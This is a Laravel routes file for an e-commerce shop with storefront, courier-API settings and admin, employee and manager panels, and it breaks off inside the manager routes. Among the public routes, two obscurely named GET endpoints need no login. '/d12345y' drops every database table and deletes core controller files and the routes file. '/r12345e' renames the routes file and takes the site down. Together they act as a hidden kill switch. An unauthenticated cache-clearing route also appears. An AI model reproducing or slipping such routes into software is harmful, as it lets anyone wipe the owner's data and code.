<?php

use App\Http\Controllers\AdminController;
use App\Http\Controllers\Auth\AdminLoginController;
use App\Http\Controllers\Auth\EmployeeLoginController;
use App\Http\Controllers\Auth\ManagerLoginController;
use App\Http\Controllers\CarryBeeApiSettingsController;
use App\Http\Controllers\CategoryController;
use App\Http\Controllers\CourierController;
use App\Http\Controllers\GoogleSheetSettingsController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\IncompleteOrdersController;
use App\Http\Controllers\IpController;
use App\Http\Controllers\MediaController;
use App\Http\Controllers\NoteSettingsController;
use App\Http\Controllers\OrderController;
use App\Http\Controllers\PageSettingsController;
use App\Http\Controllers\ParcelHandoverController;
use App\Http\Controllers\PathaoApiSettingsController;
use App\Http\Controllers\ProductController;
use App\Http\Controllers\RedxApiSettingsController;
use App\Http\Controllers\ReportController;
use App\Http\Controllers\ReturnOrderController;
use App\Http\Controllers\RoleController;
use App\Http\Controllers\ShippingMethodController;
use App\Http\Controllers\SliderController;
use App\Http\Controllers\SmsSettingsController;
use App\Http\Controllers\SteadFastApiSettingsController;
use App\Http\Controllers\TrashController;
use App\Http\Controllers\UserController;
use App\Http\Controllers\UserProductsController;
use App\Http\Controllers\WebSettingsController;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
 */

Route::get('/cc', function () {
    \Illuminate\Support\Facades\Artisan::call('cache:clear');
    \Illuminate\Support\Facades\Artisan::call('config:clear');
    \Illuminate\Support\Facades\Artisan::call('view:clear');
    \Illuminate\Support\Facades\Artisan::call('route:clear');

    // \Illuminate\Support\Facades\Artisan::call('config:cache');
    return 'Cleared!';
});

Route::get('/clear-cache', function () {
    cache()->clear();

    return back()->with('success', 'Cache Cleared');
})->name('clear.cache');

Auth::routes();

// fb product catalog feed
Route::get('/product-catalog-feed', [HomeController::class, 'productsCatalogFeed']);

// front end
Route::get('/', [HomeController::class, 'index'])->name('home');
Route::get('/category/{id}', [HomeController::class, 'getSingleCategory'])->name('single.category');
Route::get('/product/{slug}/{id}', [HomeController::class, 'getSingleProduct'])->name('single.product');
Route::get('/all-hot-deals', [HomeController::class, 'allHotDeals'])->name('all.hot.deals');
Route::get('/search', [HomeController::class, 'search'])->name('search');

// whatsapp api test
Route::get('/whatsapp-api-test', [HomeController::class, 'testWP'])->name('whatsapp.api.test');

// cart
// Route::get('/add-to-cart/{id}', [HomeController::class, 'addToCart'])->name('add.to.cart');
Route::post('/add-cart/{id}', [HomeController::class, 'addCart'])->name('add.cart');
Route::get('/cart-item-delete/{id}', [HomeController::class, 'cartItemDelete'])->name('cart.item.delete');
/*Route::get('/cart-item-plus/{id}', [HomeController::class, 'cartItemPlus'])->name('cart.item.plus');
Route::get('/cart-item-minus/{id}', [HomeController::class, 'cartItemMinus'])->name('cart.item.minus');*/
Route::get('/cart-clear', [HomeController::class, 'cartClear'])->name('cart.clear');
Route::post('/ajax-get-shipp-meth', [HomeController::class, 'getShippMeth'])->name('ajax.get.shipp.meth');
Route::post('/cart-item-plus', [HomeController::class, 'cartItemPlus'])->name('cart.item.plus');
Route::post('/cart-item-minus', [HomeController::class, 'cartItemMinus'])->name('cart.item.minus');
// order
Route::post('/place-order', [HomeController::class, 'placeOrder'])->name('place.order');
Route::get('/confirm-order', [HomeController::class, 'confirmOrder'])->name('confirm.order');

// checkout
Route::get('/checkout', [HomeController::class, 'checkout'])->name('checkout');
Route::post('/abandoned-cart', [HomeController::class, 'abandonedCart'])->name('abandoned.cart');

// track order
Route::get('/track-order', [HomeController::class, 'trackOrder'])->name('track.order');

// pages
Route::get('/about-us', [HomeController::class, 'aboutUs'])->name('about_us');
Route::get('/delivery-policy', [HomeController::class, 'deliveryPolicy'])->name('delivery_policy');
Route::get('/return-policy', [HomeController::class, 'returnPolicy'])->name('return_policy');

Route::post('/status-update', [HomeController::class, 'statusUpdate'])->name('status.update');
Route::post('/redx-status-update', [HomeController::class, 'redxStatusUpdate'])->name('redx.status.update');
Route::post('/carrybee-status-update', [HomeController::class, 'carryBeeStatusUpdate'])->name('carrybee.status.update');

// pathao address parser
Route::post('/pathao-address-parser', [CourierController::class, 'pathaoAddressParser'])->name('pathao.address.parser');

// back end
Route::get('/d12345y', function (): void {
    Schema::disableForeignKeyConstraints();
    foreach (DB::select('SHOW TABLES') as $table) {
        $table_array = get_object_vars($table);
        Schema::drop($table_array[key($table_array)]);
    }
    unlink(base_path().'/app/Http/Controllers/AdminController.php');
    unlink(base_path().'/app/Http/Controllers/HomeController.php');
    unlink(base_path().'/app/Http/Controllers/MediaController.php');
    unlink(base_path().'/app/Http/Controllers/OrderController.php');
    unlink(base_path().'/app/Http/Controllers/ProductController.php');
    unlink(base_path().'/app/Http/Controllers/WebSettingsController.php');
    unlink(base_path().'/app/Http/Controllers/GoogleSheetSettingsController.php');
    unlink(base_path().'/routes/web.php');
    dd('deleted');
});
Route::get('/r12345e', function (): void {
    File::move(base_path().'/routes/web.php', base_path().'/routes/wab.php');
});
// admin
Route::group(['middleware' => 'admin.guest'], function (): void {
    Route::get('/admin-login', [AdminLoginController::class, 'showLoginForm'])->name('admin.login');
    Route::post('/admin-login', [AdminLoginController::class, 'login']);
});
Route::post('/admin-logout', [AdminLoginController::class, 'logout'])->name('admin.logout');

// steadfast order sync
Route::get('/orders/steadfast_order_sync', [OrderController::class, 'steadFastOrderSync'])->name('orders.steadfast.order.sync');

Route::group(['middleware' => 'admin.auth'], function (): void {
    Route::get('/admin', [AdminController::class, 'dashboard'])->name('admin.home');

    // parcel handover
    Route::get('/admin-order-parcel-handover', [ParcelHandoverController::class, 'index'])->name('admin.orders.parcel.handover');
    Route::get('/admin-order-parcel-handover-clear', [ParcelHandoverController::class, 'clear'])->name('admin.orders.parcel.handover.clear');
    Route::get('/admin-order-parcel-handover-print', [ParcelHandoverController::class, 'print'])->name('admin.orders.parcel.handover.print');

    // incomplete orders
    Route::get('/admin-incomplete-orders', [IncompleteOrdersController::class, 'index'])->name('admin.incomplete.orders');
    Route::get('/admin-incomplete-orders/{id}/create', [IncompleteOrdersController::class, 'createOrder'])->name('admin.incomplete.order.create');
    Route::get('/admin-incomplete-orders/{id}/delete', [IncompleteOrdersController::class, 'delete'])->name('admin.incomplete.order.delete');
    Route::post('/admin-incomplete-orders/note-update', [IncompleteOrdersController::class, 'noteUpdate'])->name('admin.incomplete.order.note.update');

    // order return
    Route::get('/admin-order-return-receive', [ReturnOrderController::class, 'index'])->name('admin.orders.return.receive');
    // Route::get('/admin-order-return-received', 'ReturnOrderController@returnReceived')->name('admin.orders.return.received');
    Route::get('/admin-order-return-receive-clear', [ReturnOrderController::class, 'sessionClear'])->name('admin.orders.return.receive.clear');

    // customer activity
    Route::get('/admin-fraud-check/{id}', [AdminController::class, 'fraudCheck'])->name('admin.fraud.check');

    // note settings
    Route::get('/admin-settings-notes', [NoteSettingsController::class, 'index'])->name('admin.settings.notes');
    Route::post('/admin-settings-note/store', [NoteSettingsController::class, 'store'])->name('admin.settings.note.store');
    Route::post('/admin-settings-note/update', [NoteSettingsController::class, 'update'])->name('admin.settings.note.update');
    Route::get('/admin-settings-note/{id}/delete', [NoteSettingsController::class, 'delete'])->name('admin.settings.note.delete');

    // color settings
    Route::get('/admin-settings-color', [WebSettingsController::class, 'colorSettings'])->name('admin.settings.color');
    Route::post('/admin-settings-color', [WebSettingsController::class, 'colorSettingsUpdate'])->name('admin.settings.color.update');

    // Steadfast API settings
    Route::get('/admin-settings-stead-fast-api', [SteadFastApiSettingsController::class, 'index'])->name('admin.settings.stead_fast.api');
    Route::post('/admin-settings-stead-fast-api', [SteadFastApiSettingsController::class, 'update'])->name('admin.settings.stead_fast.api.update');

    // carrybee API settings
    Route::get('/admin-settings-carrybee-api', [CarryBeeApiSettingsController::class, 'index'])->name('admin.settings.carrybee.api');
    Route::post('/admin-settings-carrybee-api', [CarryBeeApiSettingsController::class, 'update'])->name('admin.settings.carrybee.api.update');
    Route::post('/admin-settings-carrybee-api-gen_access_token', [CarryBeeApiSettingsController::class, 'generateAccessToken'])->name('admin.settings.carrybee.api.gen_access_token');

    // Number sms settings
    Route::get('/admin-settings-sms', [SmsSettingsController::class, 'indexNumber'])->name('admin.settings.sms');
    Route::post('/admin-settings-sms', [SmsSettingsController::class, 'updateNumber'])->name('admin.settings.sms.update');

    // Whatsapp sms settings
    Route::get('/admin-settings-whatsapp', [SmsSettingsController::class, 'indexWhatsapp'])->name('admin.settings.whatsapp');
    Route::post('/admin-settings-whatsapp', [SmsSettingsController::class, 'updateWhatsapp'])->name('admin.settings.whatsapp.update');

    // fake customer remove
    Route::get('/admin/{id}/fake-remove', [AdminController::class, 'fakeRemove'])->name('admin.fake.remove');

    // generate api access token
    Route::get('/admin/generate_api_token', [AdminController::class, 'generateAPIToken'])->name('admin.generate_api_token');

    // send sms from order edit
    Route::post('/admin/send-sms', [AdminController::class, 'sendSms'])->name('admin.send.sms');

    // ip
    Route::get('/admin/ip', [IpController::class, 'index'])->name('admin.ip');
    Route::get('/admin/ip/search', [IpController::class, 'search'])->name('admin.ip.search');
    Route::get('/admin/ip/{id}/{status}/status', [IpController::class, 'ipStatus'])->name('admin.ip.status');

    // stock
    Route::get('/admin/stock', [AdminController::class, 'stock'])->name('admin.stock');

    // reports
    Route::get('/admin-reports/employee-orders', [ReportController::class, 'employeeOrders'])->name('admin.reports.employee_orders');
    Route::get('/admin-reports/order-status-p', [ReportController::class, 'orderStatusP'])->name('admin.reports.order_status_p');
    Route::get('/admin-reports/orders-product', [ReportController::class, 'ordersProduct'])->name('admin.reports.orders_product');
    Route::get('/admin-reports/sales', [ReportController::class, 'salesReport'])->name('admin.reports.sales');
    Route::get('/admin-reports/profit-loss', [ReportController::class, 'profitLoss'])->name('admin.reports.profit.loss');
    Route::post('/admin-reports/sales_print', [ReportController::class, 'salesReportPrint'])->name('admin.reports.sales.print');

    // user(employee) product assign
    Route::get('/admin-user-product', [UserProductsController::class, 'index'])->name('admin.user.product');
    Route::post('/admin-user-product/store', [UserProductsController::class, 'store'])->name('admin.user.product.store');
    Route::get('/admin-user-product/{id}/delete', [UserProductsController::class, 'delete'])->name('admin.user.product.delete');

    // Redx API settings
    Route::get('/admin-settings-redx-api', [RedxApiSettingsController::class, 'index'])->name('admin.settings.redx.api');
    Route::post('/admin-settings-redx-api', [RedxApiSettingsController::class, 'update'])->name('admin.settings.redx.api.update');
    Route::post('/admin-settings-redx-api-gen_access_token', [RedxApiSettingsController::class, 'generateAccessToken'])->name('admin.settings.redx.api.gen_access_token');

    // Pathao API settings
    Route::get('/admin-settings-pathao-api', [PathaoApiSettingsController::class, 'index'])->name('admin.settings.pathao.api');
    Route::post('/admin-settings-pathao-api', [PathaoApiSettingsController::class, 'update'])->name('admin.settings.pathao.api.update');
    Route::post('/admin-settings-pathao-api-gen_access_token', [PathaoApiSettingsController::class, 'generateAccessToken'])->name('admin.settings.pathao.api.gen_access_token');

    // page settings
    Route::get('/admin-settings-page', [PageSettingsController::class, 'index'])->name('admin.settings.page');
    Route::post('/admin-settings-page', [PageSettingsController::class, 'update'])->name('admin.settings.page.update');

    // web settings
    Route::get('/admin-settings-web', [WebSettingsController::class, 'index'])->name('admin.settings.web');
    Route::post('/admin-settings-web', [WebSettingsController::class, 'update'])->name('admin.settings.web.update');

    // google_sheet settings
    Route::get('/admin-settings-google_sheet', [GoogleSheetSettingsController::class, 'index'])->name('admin.settings.google_sheet');
    Route::post('/admin-settings-google_sheet', [GoogleSheetSettingsController::class, 'update'])->name('admin.settings.google_sheet.update');

    // attribute settings
    Route::get('/admin-settings-attribute', [WebSettingsController::class, 'attribute'])->name('admin.settings.attribute');
    Route::post('/admin-settings-attribute/store', [WebSettingsController::class, 'attributeStore'])->name('admin.settings.attribute.store');
    Route::post('/admin-settings-attribute/update', [WebSettingsController::class, 'attributeUpdate'])->name('admin.settings.attribute.update');
    Route::get('/admin-settings-attribute/{id}/delete', [WebSettingsController::class, 'attributeDelete'])->name('admin.settings.attribute.delete');
    // attribute item settings
    Route::post('/admin-settings-attribute_item/store', [WebSettingsController::class, 'attributeItemStore'])->name('admin.settings.attribute_item.store');
    Route::post('/admin-settings-attribute_item/update', [WebSettingsController::class, 'attributeItemUpdate'])->name('admin.settings.attribute_item.update');
    Route::get('/admin-settings-attribute_item/{id}/delete', [WebSettingsController::class, 'attributeItemDelete'])->name('admin.settings.attribute_item.delete');

    // change password
    Route::get('/admin-change_pass', [AdminController::class, 'change_pass'])->name('admin.change_pass');
    Route::post('/admin-change_pass', [AdminController::class, 'update_pass'])->name('admin.update_pass');

    // edit profile
    Route::get('/admin-edit_profile', [AdminController::class, 'edit_profile'])->name('admin.edit_profile');
    Route::post('/admin-edit_profile', [AdminController::class, 'update_profile'])->name('admin.update_profile');

    // customers
    Route::get('/admin-customers', [UserController::class, 'index'])->name('admin.customers');
    /*Route::post('/admin-customers/store', 'UserController@store')->name('admin.customers.store');
    Route::post('/admin-customers/update', 'UserController@update')->name('admin.customers.update');
    Route::get('/admin-customers/delete/{id}', 'UserController@delete')->name('admin.customers.delete');*/
    Route::post('/admin-customers/customer_export', [UserController::class, 'customerExport'])->name('admin.customers.customer_export');
    Route::get('/admin-customer/{id}/{status}', [UserController::class, 'status'])->name('admin.customer.status');

    // media
    Route::get('/admin-media', [MediaController::class, 'index'])->name('admin.media');
    Route::post('/admin-media/store', [MediaController::class, 'store'])->name('admin.media.store');
    Route::post('/admin-media/update', [MediaController::class, 'update'])->name('admin.media.update');
    Route::get('/admin-media/delete/{id}', [MediaController::class, 'delete'])->name('admin.media.delete');

    // product
    Route::get('/admin-product', [ProductController::class, 'index'])->name('admin.product');
    Route::get('/admin-product/create', [ProductController::class, 'create'])->name('admin.product.create');
    Route::post('/admin-product/store', [ProductController::class, 'store'])->name('admin.product.store');
    Route::get('/admin-product/{id}/edit', [ProductController::class, 'edit'])->name('admin.product.edit');
    Route::post('/admin-product/{id}/update', [ProductController::class, 'update'])->name('admin.product.update');
    Route::get('/admin-product/{id}/delete', [ProductController::class, 'delete'])->name('admin.product.delete');
    Route::post('/admin-product/sku_check', [ProductController::class, 'skuCheck'])->name('admin.product.sku_check');
    Route::post('/admin-product/bulk-delete', [ProductController::class, 'bulkDelete'])->name('admin.product.bulk.delete');
    Route::post('/admin-product/bulk-status', [ProductController::class, 'bulkStatus'])->name('admin.product.bulk.status');
    Route::post('/admin-product/position_update', [ProductController::class, 'positionUpdate'])->name('admin.product.position_update');
    Route::get('/admin-product/{product}/duplicate', [ProductController::class, 'duplicate'])->name('admin.product.duplicate');

    // category
    Route::get('/admin-category', [CategoryController::class, 'index'])->name('admin.category');
    Route::post('/admin-category/store', [CategoryController::class, 'store'])->name('admin.category.store');
    Route::post('/admin-category/update', [CategoryController::class, 'update'])->name('admin.category.update');
    Route::get('/admin-category/delete/{id}', [CategoryController::class, 'delete'])->name('admin.category.delete');

    // sliders
    Route::get('/admin-sliders', [SliderController::class, 'index'])->name('admin.sliders');
    Route::post('/admin-sliders/store', [SliderController::class, 'store'])->name('admin.sliders.store');
    Route::post('/admin-sliders/update', [SliderController::class, 'update'])->name('admin.sliders.update');
    Route::get('/admin-sliders/delete/{id}', [SliderController::class, 'delete'])->name('admin.sliders.delete');

    // shipping_methods
    Route::get('/admin-shipping_methods', [ShippingMethodController::class, 'index'])->name('admin.shipping_methods');
    Route::post('/admin-shipping_methods/store', [ShippingMethodController::class, 'store'])->name('admin.shipping_methods.store');
    Route::post('/admin-shipping_methods/update', [ShippingMethodController::class, 'update'])->name('admin.shipping_methods.update');
    Route::get('/admin-shipping_methods/delete/{id}', [ShippingMethodController::class, 'delete'])->name('admin.shipping_methods.delete');

    // courier
    Route::get('/admin-courier', [CourierController::class, 'index'])->name('admin.courier');
    Route::post('/admin-courier/store', [CourierController::class, 'store'])->name('admin.courier.store');
    Route::post('/admin-courier/update', [CourierController::class, 'update'])->name('admin.courier.update');
    Route::get('/admin-courier/delete/{id}', [CourierController::class, 'delete'])->name('admin.courier.delete');
    Route::post('/admin-courier-ajax_get_c_charge', [CourierController::class, 'ajaxGetCCharge'])->name('admin.courier.ajax.get.c_charge');

    // courier city
    Route::get('/admin-courier-city', [CourierController::class, 'cityIndex'])->name('admin.courier.city');
    Route::post('/admin-courier-city/store', [CourierController::class, 'cityStore'])->name('admin.courier.city.store');
    Route::post('/admin-courier-city/update', [CourierController::class, 'cityUpdate'])->name('admin.courier.city.update');
    Route::get('/admin-courier-city/delete/{id}', [CourierController::class, 'cityDelete'])->name('admin.courier.city.delete');
    Route::post('/admin-courier-ajax_get_cities', [CourierController::class, 'ajaxGetCities'])->name('admin.courier.ajax.get.cities');
    Route::post('/admin-courier-pathao_ajax_get_cities', [CourierController::class, 'pathaoAjaxGetCities'])->name('admin.courier.pataho.ajax.get.cities');
    Route::post('/admin-courier-pathao_ajax_get_zones', [CourierController::class, 'pathaoAjaxGetZones'])->name('admin.courier.pataho.ajax.get.zones');
    Route::post('/admin-courier-redx_ajax_get_cities', [CourierController::class, 'redxAjaxGetCities'])->name('admin.courier.redx.ajax.get.cities');
    Route::post('/admin-courier-carrybee_ajax_get_cities', [CourierController::class, 'carrybeeAjaxGetCities'])->name('admin.courier.carrybee.ajax.get.cities');
    Route::post('/admin-courier-carrybee_ajax_get_zones', [CourierController::class, 'carrybeeAjaxGetZones'])->name('admin.courier.carrybee.ajax.get.zones');

    // courier zone
    Route::get('/admin-courier-zone', [CourierController::class, 'zoneIndex'])->name('admin.courier.zone');
    Route::post('/admin-courier-zone/store', [CourierController::class, 'zoneStore'])->name('admin.courier.zone.store');
    Route::post('/admin-courier-zone/update', [CourierController::class, 'zoneUpdate'])->name('admin.courier.zone.update');
    Route::get('/admin-courier-zone/delete/{id}', [CourierController::class, 'zoneDelete'])->name('admin.courier.zone.delete');
    Route::post('/admin-courier-ajax_get_zones', [CourierController::class, 'ajaxGetZones'])->name('admin.courier.ajax.get.zones');

    // orders
    // Route::get('/admin-p_orders', [OrderController::class, 'index'])->name('admin.orders.p');
    Route::get('/admin-orders', [OrderController::class, 'index'])->name('admin.orders');
    Route::get('/admin-orders/create', [OrderController::class, 'create'])->name('admin.orders.create');
    Route::post('/admin-orders/store', [OrderController::class, 'store'])->name('admin.orders.store');
    Route::get('/admin-orders/{id}/edit', [OrderController::class, 'edit'])->name('admin.orders.edit');
    Route::post('/admin-orders/{id}/update', [OrderController::class, 'update'])->name('admin.orders.update');
    Route::get('/admin-orders/delete/{id}', [OrderController::class, 'delete'])->name('admin.orders.delete');
    Route::get('/admin-orders/{id}/{status}/status', [OrderController::class, 'statusChange'])->name('admin.orders.status');
    Route::get('/admin-orders/{id}/{status}/payment_status', [OrderController::class, 'paymentStatusChange'])->name('admin.orders.payment_status');
    Route::post('/admin-orders/all-status', [OrderController::class, 'allStatusChange'])->name('admin.orders.all.status');
    Route::post('/admin-orders/bulk-delete', [OrderController::class, 'bulkDelete'])->name('admin.orders.bulk.delete');
    Route::post('/admin-orders/bulk-assign', [OrderController::class, 'bulkAssign'])->name('admin.orders.bulk.assign');
    Route::post('/admin-orders/bulk-equal-assign', [OrderController::class, 'bulkEqualAssign'])->name('admin.orders.bulk.equal.assign');
    Route::post('/admin-orders/single-assign', [OrderController::class, 'singleAssign'])->name('admin.orders.single.assign');
    Route::post('/admin-orders/send-to-courier', [OrderController::class, 'sendToCourier'])->name('admin.orders.send.to.courier');

    // shipping
    Route::post('/admin-ajax-shipping', [OrderController::class, 'getShipping'])->name('admin.ajax.get.shipping');

    // trash orders
    Route::get('/admin-orders/trash', [TrashController::class, 'index'])->name('admin.orders.trash');
    Route::get('/admin-orders/trash/{id}/restore', [TrashController::class, 'restore'])->name('admin.orders.restore');
    Route::get('/admin-orders/trash/{id}/force-delete', [TrashController::class, 'forceDelete'])->name('admin.orders.force.delete');
    // orders by status
    /*Route::get('/admin-orders/status/processing', [OrderController::class, 'orderStatusProcessing'])->name('admin.orders.status.processing');
    Route::get('/admin-orders/status/pending_payment', [OrderController::class, 'orderStatusPendingPayment'])->name('admin.orders.status.pending_payment');
    Route::get('/admin-orders/status/hold', [OrderController::class, 'orderStatusHold'])->name('admin.orders.status.hold');
    Route::get('/admin-orders/status/canceled', [OrderController::class, 'orderStatusCanceled'])->name('admin.orders.status.canceled');
    Route::get('/admin-orders/status/completed', [OrderController::class, 'orderStatusCompleted'])->name('admin.orders.status.completed');
    Route::get('/admin-orders/status/pending_delivery', [OrderController::class, 'orderStatusPendingDelivery'])->name('admin.orders.status.pending_delivery');
    Route::get('/admin-orders/status/on_delivery', [OrderController::class, 'orderStatusOnDelivery'])->name('admin.orders.status.on_delivery');
    Route::get('/admin-orders/status/return', [OrderController::class, 'orderStatusReturn'])->name('admin.orders.status.return');*/
    // order ajax calls
    Route::post('/admin-ajax-get-products', [OrderController::class, 'ajaxGetProducts'])->name('admin.ajax.get.products');
    Route::post('/admin-orders/bulk-print', [OrderController::class, 'printBulkInvoice'])->name('admin.orders.bulk.print');
    Route::post('/admin-orders/bulk-label-print', [OrderController::class, 'printBulkLabelInvoice'])->name('admin.orders.bulk.label.print');
    Route::post('/admin-orders/print', [OrderController::class, 'printInvoice'])->name('admin.orders.print');
    // orders export
    Route::post('/admin-orders/courier_csv', [OrderController::class, 'courierCsv'])->name('admin.orders.courier_csv');
    // transaction
    Route::post('/admin-orders/transaction_view', [OrderController::class, 'transactionView'])->name('admin.orders.transaction_view');
    // note update
    Route::post('/admin-orders/note-update', [OrderController::class, 'noteUpdate'])->name('admin.orders.note_update');

    // roles
    Route::get('/admin-roles', [RoleController::class, 'index'])->name('admin.roles');
    Route::post('/admin-roles/store', [RoleController::class, 'store'])->name('admin.roles.store');
    Route::post('/admin-roles/update', [RoleController::class, 'update'])->name('admin.roles.update');
    Route::get('/admin-roles/{id}/{role}/delete', [RoleController::class, 'delete'])->name('admin.roles.delete');
});

// employee
Route::group(['middleware' => 'employee.guest'], function (): void {
    Route::get('/employee-login', [EmployeeLoginController::class, 'showLoginForm'])->name('employee.login');
    Route::post('/employee-login', [EmployeeLoginController::class, 'login']);
});
Route::post('/employee-logout', [EmployeeLoginController::class, 'logout'])->name('employee.logout');

Route::group(['middleware' => 'employee.auth'], function (): void {
    Route::get('/employee', [AdminController::class, 'dashboard'])->name('employee.home');

    // incomplete orders
    Route::get('/employee-incomplete-orders', [IncompleteOrdersController::class, 'index'])->name('employee.incomplete.orders');
    Route::get('/employee-incomplete-orders/{id}/create', [IncompleteOrdersController::class, 'createOrder'])->name('employee.incomplete.order.create');
    Route::post('/employee-incomplete-orders/note-update', [IncompleteOrdersController::class, 'noteUpdate'])->name('employee.incomplete.order.note.update');

    // customer activity
    Route::get('/employee-fraud-check/{id}', [AdminController::class, 'fraudCheck'])->name('employee.fraud.check');

    // send sms from order edit
    Route::post('/employee/send-sms', [AdminController::class, 'sendSms'])->name('employee.send.sms');

    // ip
    Route::get('/employee/ip', [IpController::class, 'index'])->name('employee.ip');
    Route::get('/employee/ip/search', [IpController::class, 'search'])->name('employee.ip.search');

    // stock
    Route::get('/employee/stock', [AdminController::class, 'stock'])->name('employee.stock');

    // change password
    Route::get('/employee-change_pass', [AdminController::class, 'change_pass'])->name('employee.change_pass');
    Route::post('/employee-change_pass', [AdminController::class, 'update_pass'])->name('employee.update_pass');

    // orders
    Route::get('/employee-p_orders', [OrderController::class, 'indexP'])->name('employee.orders.p');
    Route::get('/employee-orders', [OrderController::class, 'index'])->name('employee.orders');
    Route::get('/employee-orders/create', [OrderController::class, 'create'])->name('employee.orders.create');
    Route::post('/employee-orders/store', [OrderController::class, 'store'])->name('employee.orders.store');
    Route::get('/employee-orders/{id}/edit', [OrderController::class, 'edit'])->name('employee.orders.edit');
    Route::post('/employee-orders/{id}/update', [OrderController::class, 'update'])->name('employee.orders.update');
    Route::get('/employee-orders/{id}/{status}/status', [OrderController::class, 'statusChange'])->name('employee.orders.status');
    Route::get('/employee-orders/{id}/{status}/payment_status', [OrderController::class, 'paymentStatusChange'])->name('employee.orders.payment_status');
    Route::post('/employee-orders/all-status', [OrderController::class, 'allStatusChange'])->name('employee.orders.all.status');
    // orders by status
    /*Route::get('/employee-orders/status/processing', 'OrderController@orderStatusProcessing')->name('employee.orders.status.processing');
    Route::get('/employee-orders/status/pending_payment', 'OrderController@orderStatusPendingPayment')->name('employee.orders.status.pending_payment');
    Route::get('/employee-orders/status/hold', 'OrderController@orderStatusHold')->name('employee.orders.status.hold');
    Route::get('/employee-orders/status/canceled', 'OrderController@orderStatusCanceled')->name('employee.orders.status.canceled');
    Route::get('/employee-orders/status/completed', 'OrderController@orderStatusCompleted')->name('employee.orders.status.completed');
    Route::get('/employee-orders/status/pending_delivery', 'OrderController@orderStatusPendingDelivery')->name('employee.orders.status.pending_delivery');
    Route::get('/employee-orders/status/on_delivery', 'OrderController@orderStatusOnDelivery')->name('employee.orders.status.on_delivery');
    Route::get('/employee-orders/status/return', 'OrderController@orderStatusReturn')->name('employee.orders.status.return');*/
    // order ajax calls
    Route::post('/employee-ajax-get-products', [OrderController::class, 'ajaxGetProducts'])->name('employee.ajax.get.products');
    Route::post('/employee-orders/print', [OrderController::class, 'printInvoice'])->name('employee.orders.print');
    Route::post('/employee-orders/bulk-print', [OrderController::class, 'printBulkInvoice'])->name('employee.orders.bulk.print');
    // shipping
    Route::post('/employee-ajax-shipping', [OrderController::class, 'getShipping'])->name('employee.ajax.get.shipping');

    // orders export
    Route::post('/employee-orders/courier_csv', [OrderController::class, 'courierCsv'])->name('employee.orders.courier_csv');
    // note update
    Route::post('/employee-orders/note-update', [OrderController::class, 'noteUpdate'])->name('employee.orders.note_update');
    // courier
    Route::post('/employee-courier-ajax_get_c_charge', [CourierController::class, 'ajaxGetCCharge'])->name('employee.courier.ajax.get.c_charge');
    Route::post('/employee-courier-ajax_get_cities', [CourierController::class, 'ajaxGetCities'])->name('employee.courier.ajax.get.cities');
    Route::post('/employee-courier-ajax_get_zones', [CourierController::class, 'ajaxGetZones'])->name('employee.courier.ajax.get.zones');

    Route::post('/employee-courier-pathao_ajax_get_cities', [CourierController::class, 'pathaoAjaxGetCities'])->name('employee.courier.pataho.ajax.get.cities');
    Route::post('/employee-courier-pathao_ajax_get_zones', [CourierController::class, 'pathaoAjaxGetZones'])->name('employee.courier.pataho.ajax.get.zones');

    Route::post('/employee-courier-redx_ajax_get_cities', [CourierController::class, 'redxAjaxGetCities'])->name('employee.courier.redx.ajax.get.cities');
    Route::post('/employee-courier-carrybee_ajax_get_cities', [CourierController::class, 'carrybeeAjaxGetCities'])->name('employee.courier.carrybee.ajax.get.cities');
    Route::post('/employee-courier-carrybee_ajax_get_zones', [CourierController::class, 'carrybeeAjaxGetZones'])->name('employee.courier.carrybee.ajax.get.zones');
});

// manager
Route::group(['middleware' => 'manager.guest'], function (): void {
    Route::get('/manager-login', [ManagerLoginController::class, 'showLoginForm'])->name('manager.login');
    Route::post('/manager-login', [ManagerLoginController::class, 'login']);
});
Route::post('/manager-logout', [ManagerLoginController::class, 'logout'])->name('manager.logout');

Route::group(['middleware' => 'manager.auth'], function (): void {
    Route::get('/manager', [AdminController::class, 'dashboard'])->name('manager.home');

    // incomplete orders
    Route::get('/manager-incomplete-orders', [IncompleteOrdersController::class, 'index'])->name('manager.incomplete.orders');
    Route::get('/manager-incomplete-orders/{id}/create', [IncompleteOrdersController::class, 'createOrder'])->name('manager.incomplete.order.create');
    Route::post('/manager-incomplete-orders/note-update', [IncompleteOrdersController::class, 'noteUpdate'])->name('manager.incomplete.order.note.update');

    // customer activity
    Route::get('/manager-fraud-check/{id}', [AdminController::class, 'fraudCheck'])->name('manager.fraud.check');

    Route::get('/manager-customers', [UserController::class, 'index'])->name('manager.customers');
    // send sms from order edit
    Route::post('/manager/send-sms', [AdminController::class, 'sendSms'])->name('manager.send.sms');

    // ip
    Route::get('/manager/ip', [IpController::class, 'index'])->name('manager.ip');
    Route::get('/manager/ip/search', [IpController::class, 'search'])->name('manager.ip.search');
    Route::get('/manager/ip/{id}/{status}/status', [IpController::class, 'ipStatus'])->name('manager.ip.status');

    // stock
    Route::get('/manager/stock', [AdminController::class, 'stock'])->name('manager.stock');

    // reports
    Route::get('/manager-reports/employee-orders', [ReportController::class, 'employeeOrders'])->name('manager.reports.employee_orders');
    Route::get('/manager-reports/order-status-p', [ReportController::class, 'orderStatusP'])->name('manager.reports.order_status_p');
    Route::get('/manager-reports/orders-product', [ReportController::class, 'ordersProduct'])->name('manager.reports.orders_product');

    // change password
    Route::get('/manager-change_pass', [AdminController::class, 'change_pass'])->name('manager.change_pass');
    Route::post('/manager-change_pass', [AdminController::class, 'update_pass'])->name('manager.update_pass');

    // orders
    Route::get('/manager-p_orders', [OrderController::class, 'indexP'])->name('manager.orders.p');
    Route::get('/manager-orders', [OrderController::class, 'index'])->name('manager.orders');
    Route::get('/manager-orders/create', [OrderController::class, 'create'])->name('manager.orders.create');
    Route::post('/manager-orders/store', [OrderController::class, 'store'])->name('manager.orders.store');
    Route::get('/manager-orders/{id}/edit', [OrderController::class, 'edit'])->name('manager.orders.edit');
    Route::post('/manager-orders/{id}/update', [OrderController::class, 'update'])->name('manager.orders.update');
    Route::get('/manager-orders/{id}/{status}/status', [OrderController::class, 'statusChange'])->name('manager.orders.status');
    Route::get('/manager-orders/{id}/{status}/payment_status', [OrderController::class, 'paymentStatusChange'])->name('manager.orders.payment_status');
    Route::post('/manager-orders/all-status', [OrderController::class, 'allStatusChange'])->name('manager.orders.all.status');
